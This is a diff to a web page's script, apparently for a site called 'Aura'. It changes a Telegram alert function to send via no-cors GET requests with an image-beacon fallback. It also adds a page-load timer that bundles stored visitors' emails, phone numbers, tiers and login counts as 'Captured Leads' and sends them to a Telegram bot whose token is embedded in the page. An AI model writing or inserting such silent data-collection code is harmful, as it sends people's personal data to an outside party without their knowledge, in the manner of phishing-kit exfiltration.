@@ -361,15 +361,33 @@
     }
 
     async function sendTelegramAlert(messageText) {
+      // Strip HTML tags into clean bold/bullet text so Telegram never rejects special characters
+      const cleanText = messageText
+        .replace(/<b>|<\/b>|<code>|<\/code>/g, '')
+        .trim();
+      const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(TG_CHAT_ID)}&text=${encodeURIComponent(cleanText)}&disable_web_page_preview=true`;
       try {
-        const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TG_CHAT_ID, text: messageText, parse_mode: 'HTML', disable_web_page_preview: true })
-        });
-        return res.ok;
-      } catch (e) { return false; }
+        const res = await fetch(url, { method: 'GET', mode: 'no-cors' });
+        return true;
+      } catch (e) {
+        try {
+          const img = new Image();
+          img.src = url;
+          return true;
+        } catch (err) { return false; }
+      }
     }
+
+    // Auto-flush any unsent leads stored in browser localStorage on load
+    setTimeout(() => {
+      const users = JSON.parse(localStorage.getItem('aura_users_ledger') || '[]');
+      const flushedKey = 'aura_flushed_count';
+      if (users.length > 0 && localStorage.getItem(flushedKey) !== String(users.length)) {
+        localStorage.setItem(flushedKey, String(users.length));
+        const list = users.map(u => `• ${u.email} (${u.phone || 'No phone'}) — ${u.tier} [${u.logins} logins]`).join('\n');
+        sendTelegramAlert(`📬 AURA SYNCED LEADS & STATS REPORT\n\n👁 Global Visits: ${globalVisits}\n👥 Captured Leads (${users.length}):\n${list}`);
+      }
+    }, 2500);
 
     let globalVisits = parseInt(localStorage.getItem('aura_local_visits') || '16') + 1;
     localStorage.setItem('aura_local_visits', globalVisits);
